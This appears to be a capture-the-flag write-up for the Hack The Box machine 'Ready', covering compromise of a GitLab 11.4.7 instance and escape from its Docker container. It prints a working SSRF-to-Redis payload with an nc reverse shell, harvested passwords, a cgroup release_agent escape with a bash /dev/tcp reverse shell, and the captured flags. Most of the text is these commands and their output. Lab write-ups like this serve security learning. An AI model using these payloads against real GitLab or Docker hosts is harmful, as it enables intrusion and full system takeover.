# Ready

export IP=10.10.10.220

# Solution

Starting with an nmap scan
```
cmd: nmap -sC -sV -oN nmap/initial $IP

22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
5080/tcp open  http    nginx
| http-robots.txt: 53 disallowed entries (15 shown)
| / /autocomplete/users /search /api /admin /profile 
| /dashboard /projects/new /groups/new /groups/*/edit /users /help 
|_/s/ /snippets/new /snippets/*/edit
| http-title: Sign in \xC2\xB7 GitLab
|_Requested resource was http://10.10.10.220:5080/users/sign_in
|_http-trane-info: Problem with XML parsing of /evox/about
```


Visiting the page on port 5080 we got a gitlab instance running with version <b> GitLab Community Edition 11.4.7 </b> <br>

The LFI (and RCE) for version 12.8.7 does not work (error moving issue) <br>

By exploring the projects we can see some entries:
- ready-channel (user: dude)
- Some weird projects (need to create a repo or import from... and none works)


After a look around, i went search for a vulnerability since it is an old version and found a POC where the database (redis) is abused using SSRF by using the git protocol to abuse the "import" method <br>

Found an exploit but it does not give me the reverse shell, i'll try it manually with burp! <br>


Just need to go to <b> new project -> import -> from URL -> fill the fields (intercept) -> change the url to the payload </b>

```
git://[0:0:0:0:0:ffff:127.0.0.1]:6379/
multi

sadd resque:gitlab:queues system_hook_push

lpush resque:gitlab:queue:system_hook_push "{\"class\":\"GitlabShellWorker\",\"args\":[\"class_eval\",\"open(\'| nc 10.10.14.110 1414 -e /bin/sh \').read\"],\"retry\":3,\"queue\":\"system_hook_push\",\"jid\":\"ad52abc5641173e217eb2e52\",\"created_at\":1513714403.8122594,\"enqueued_at\":1513714403.8129568}"

exec
exec
exec
```

Need to URL-enconde the payload
```
git%3A%2F%2F%5B0%3A0%3A0%3A0%3A0%3Affff%3A127.0.0.1%5D%3A6379%2F%0Amulti%0A%0Asadd%20resque%3Agitlab%3Aqueues%20system_hook_push%0A%0Alpush%20resque%3Agitlab%3Aqueue%3Asystem_hook_push%20%22%7B%5C%22class%5C%22%3A%5C%22GitlabShellWorker%5C%22%2C%5C%22args%5C%22%3A%5B%5C%22class_eval%5C%22%2C%5C%22open%28%5C%27%7C%20nc%2010.10.14.253%201414%20-e%20%2Fbin%2Fsh%20%5C%27%29.read%5C%22%5D%2C%5C%22retry%5C%22%3A3%2C%5C%22queue%5C%22%3A%5C%22system_hook_push%5C%22%2C%5C%22jid%5C%22%3A%5C%22ad52abc5641173e217eb2e52%5C%22%2C%5C%22created_at%5C%22%3A1513714403.8122594%2C%5C%22enqueued_at%5C%22%3A1513714403.8129568%7D%22%0A%0Aexec%0Aexec%0Aexec%0A%20exec
```

And voila, manually it works perfectly !!
```
whoami && id

git
uid=998(git) gid=998(git) groups=998(git)
```

Just checked some folders (backups, home, etc.) and found that the user flag is readable by the git group 

```
cmd: ls -la /home/

drwxr-xr-x 2 dude dude 4096 Dec  7 16:58 dude

cmd: ls -la /home/dude
-r--r----- 1 dude git    33 Dec  2 10:46 user.txt

cat /home/dude/user.txt
FLAG: e1e30b052b6ec0670698805d745e7682
```

Running a linpeas as <b> git </b> we can extract
```
[+] Is this a virtual machine? ..... Yes (docker)
[+] Is this a container? ........... Looks like we're in a Docker container

/var/log/gitlab/

/opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/chef-13.6.4/spec/data/cookbooks/openldap/files/default/.ssh/id_rsa

/opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/chef-13.6.4/spec/data/dsc_lcm.pfx

/home/dude/.bash_history
-rw-r----- 1 root git 601 Jul  8 08:53 /var/opt/gitlab/gitaly/config.toml
-rw-r----- 1 root git 1064 Jul  8 08:52 /var/opt/gitlab/gitlab-shell/config.yml
-rw-r----- 1 root git 52 Jul  8 08:53 /var/opt/gitlab/gitlab-workhorse/config.toml
-rw-r----- 1 root git 17681 Jul  8 09:02 /var/opt/gitlab/gitlab-rails/etc/gitlab.yml
-rw-r----- 1 root git 527 Jul  8 08:52 /var/opt/gitlab/gitlab-rails/etc/database.yml

-rw-r--r-- 1 root root 674 Nov 20  2018 /opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/flipper-0.13.0/docker-compose.yml
-rw-r--r-- 1 root root 418 Nov 20  2018 /opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/fog-google-1.7.1/ci/docker-image/Dockerfile
-rw-r--r-- 1 root root 430 Nov 20  2018 /opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/sidekiq-cron-0.6.0/docker-compose.yml
-rw-r--r-- 1 root root 38 Nov 20  2018 /opt/gitlab/embedded/service/gitlab-rails/docker-compose.yml

/opt/backup/docker-compose.yml

/var/log/gitlab/gitaly/current
/var/log/gitlab/gitlab-workhorse/current
/var/log/gitlab/sidekiq/current
/var/log/gitlab/gitlab-rails/application.log
/var/log/gitlab/gitlab-rails/sidekiq_exporter.log
/var/log/gitlab/gitlab-rails/production_json.log
/var/log/gitlab/gitlab-rails/production.log
/var/log/gitlab/gitlab-monitor/current

Writable: /var/log/gitlab/gitlab-shell/gitlab-shell.log.7.gz
Writable: /var/log/gitlab/gitlab-shell/gitlab-shell.log
Writable: /var/log/gitlab/gitlab-shell/gitlab-shell.log.1.gz
Writable: /var/log/gitlab/gitlab-rails/production_json.log.1.gz
Writable: /var/log/gitlab/gitlab-rails/production_json.log.2.gz
Writable: /var/log/gitlab/gitlab-rails/production.log.3.gz
Writable: /var/log/gitlab/unicorn/unicorn_stderr.log.4.gz
Writable: /var/log/gitlab/unicorn/unicorn_stderr.log.2.gz
Writable: /var/log/gitlab/unicorn/unicorn_stdout.log.7.gz

```

Carefully analyzing there are some things that can be extracted from multiple files
```
File: /opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/chef-13.6.4/spec/data/cookbooks/openldap/files/default/.ssh/id_rsa
Content: FAKE KEY <- very funny, lul

File: /var/opt/gitlab/gitlab-rails/etc/database.yml
Content: Postgresql, user: gitlab, password: <empty>
Result: unable to use postgres instance

File: /opt/backup/docker-compose.yml
Content: './root_pass:/root_pass', 
/root_pass Content: YG65407Bjqvv9A0a8Tm_7w
Result: Does not work (dude and root user acc)
```

Since linpeas did not found nothing more than that it is running in a docker container, lets fiddle around to check if we can find something... <br>

One thing that i notice is that linpeas found stuff in opt, but did not really fuzzed everything out
```
cmd: ls -la /opt/*
result: 
/opt/backup:
total 112
drwxr-xr-x 2 root root  4096 Dec  7 09:25 .
drwxr-xr-x 1 root root  4096 Dec  1 16:23 ..
-rw-r--r-- 1 root root   872 Dec  7 09:25 docker-compose.yml
-rw-r--r-- 1 root root 15092 Dec  1 16:23 gitlab-secrets.json
-rw-r--r-- 1 root root 79639 Dec  1 19:20 gitlab.rb

/opt/gitlab:
total 2896
drwxr-xr-x 1 root root    4096 Dec  1 12:41 .
drwxr-xr-x 1 root root    4096 Dec  1 16:23 ..
-rw-r--r-- 1 root root 2665359 Nov 20  2018 LICENSE
drwxr-xr-x 2 root root   36864 Nov 20  2018 LICENSES
drwxr-xr-x 2 root root    4096 Nov 20  2018 bin
-rw-r--r-- 1 root root  167336 Nov 20  2018 dependency_licenses.json
drwxr-xr-x 1 root root    4096 Dec 23 15:59 embedded
drwxr-xr-x 1 root root    4096 Dec 23 16:00 etc
drwxr-xr-x 1 root root    4096 Dec 23 15:59 init
drwxr-xr-x 1 root root    4096 Dec 23 16:00 service
drwxr-xr-x 1 root root    4096 Dec  1 12:42 sv
drwxr-xr-x 3 root root    4096 Dec  1 12:41 var
-rw-r--r-- 1 root root   25350 Nov 20  2018 version-manifest.json
-rw-r--r-- 1 root root   11488 Nov 20  2018 version-manifest.txt
```

From the gilab.rb file we can check some things
```
cmd: cat gitlab.rb | grep password

gitlab_rails['smtp_password'] = "wW59U!ZKMbG9+*#h"
```
That is the only uncommented line that is returned from grep which means that it might be active... <br>

Trying it out as both users passwords (dude and root) reveals that it belongs to root...
```
cmd: su root
Password: wW59U!ZKMbG9+*#h

whoami && id
root
uid=0(root) gid=0(root) groups=0(root)
```

The flag is not at the common /root/ folder lets try to find it
```
cmd: find / -type f -name "root.txt"
results: <empty>
```

Well lets try to escape the docker container because we have the root acc for it (and is required that we have it) <br>

The exploit used is (https://book.hacktricks.xyz/linux-unix/privilege-escalation/escaping-from-a-docker-container)
```
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
 
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent

#Reverse shell
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/10.10.14.253/1415 0>&1" >> /cmd
chmod a+x /cmd
 
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
head /output
```

And voila, we have privesc
```
cmd: uname -a (docker)
result: Linux gitlab.example.com 5.4.0-40-generic #44-Ubuntu SMP Tue Jun 23 00:01:04 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux

cmd: uname -a (host)
result: Linux ready 5.4.0-40-generic #44-Ubuntu SMP Tue Jun 23 00:01:04 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux

cmd: cat /root/root.txt
FLAG: b7f98681505cd39066f67147b103c2b3
```
A way simpler exploit would be just to mount the filesystem at /dev/sda2
```
mkdir ~/tmp
mount /dev/sda2 ~/tmp
cat ~/tmp/root/root.txt
FLAG: b7f98681505cd39066f67147b103c2b3
```